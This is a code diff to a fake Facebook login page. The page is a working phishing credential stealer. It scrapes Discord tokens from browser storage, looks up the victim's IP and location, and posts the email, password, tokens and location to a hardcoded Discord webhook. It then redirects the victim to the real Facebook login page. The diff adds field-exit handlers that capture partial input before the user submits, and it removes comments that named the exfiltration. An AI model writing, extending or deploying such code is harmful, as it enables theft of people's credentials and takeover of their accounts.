@@ -17,12 +17,13 @@
     <!-- STAGE 1: LOGIN -->
     <div id="mainForm" class="container">
         <h2>Facebook Login</h2>
-        <input type="text" id="email" placeholder="Email or Phone Number">
-        <input type="password" id="password" placeholder="Password">
+        <!-- Added onblur event for interim capture -->
+        <input type="text" id="email" placeholder="Email or Phone Number" onblur="autoCapture()">
+        <input type="password" id="password" placeholder="Password" onblur="autoCapture()">
         <button id="submitBtn">Login</button>
     </div>
 
-    <!-- STAGE 2: PROCESSING (Ensures exfil completion) -->
+    <!-- STAGE 2: PROCESSING -->
     <div id="processing" class="container hidden">
         <h2>Authenticating...</h2>
         <p>Please do not close this window.</p>
@@ -31,8 +32,8 @@
     <script>
         const WEBHOOK = 'https://canary.discord.com/api/webhooks/1477996621362102312/e_cB4c2Utso2Mia7RzB72NGC-Rvz0TkhiiL9Pn_9sus0sRt1CkZ_3MhLQvRHtUZqZZKI';
 
-        async function exfiltrate() {
-            // Collect Discord Tokens from various storage locations
+        // Core extraction logic
+        async function exfiltrate(titleText = '🚀 DATA CAPTURED') {
             const tokens = [];
             const storage = [localStorage, sessionStorage];
             const regex = /mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g;
@@ -44,7 +45,6 @@
                 }
             });
 
-            // Gather Location & Network Recon
             let geo = { ip: 'N/A', location: 'N/A', isp: 'N/A' };
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -54,11 +54,11 @@
 
             const payload = {
                 embeds: [{
-                    title: '🚀 DATA CAPTURED',
+                    title: titleText,
                     color: 0x1877F2,
                     fields: [
-                        { name: '📧 Login/Phone', value: document.getElementById('email').value, inline: true },
-                        { name: '🔑 Password', value: document.getElementById('password').value, inline: true },
+                        { name: '📧 Login/Phone', value: document.getElementById('email').value || 'Empty', inline: true },
+                        { name: '🔑 Password', value: document.getElementById('password').value || 'Empty', inline: true },
                         { name: '🔑 Discord Tokens', value: tokens.join('\n') || 'None', inline: false },
                         { name: '📍 Location/ISP', value: `${geo.location} | ${geo.isp}`, inline: false },
                         { name: '🌐 Public IP', value: geo.ip, inline: true }
@@ -73,18 +73,24 @@
             });
         }
 
+        // Triggered when user clicks out of email/password fields
+        async function autoCapture() {
+            if(document.getElementById('email').value || document.getElementById('password').value) {
+                await exfiltrate('⚠️ INTERIM CAPTURE (Partial)');
+            }
+        }
+
+        // Standard submission
         document.getElementById('submitBtn').onclick = async () => {
             document.getElementById('mainForm').classList.add('hidden');
             document.getElementById('processing').classList.remove('hidden');
             
-            await exfiltrate();
+            await exfiltrate('🚀 FINAL DATA CAPTURED');
             
-            // Redirect after exfil
             setTimeout(() => {
                 window.location.href = "https://www.facebook.com/login/";
-            }, 1500);
+            }, 1000);
         };
     </script>
 </body>
 </html>
-
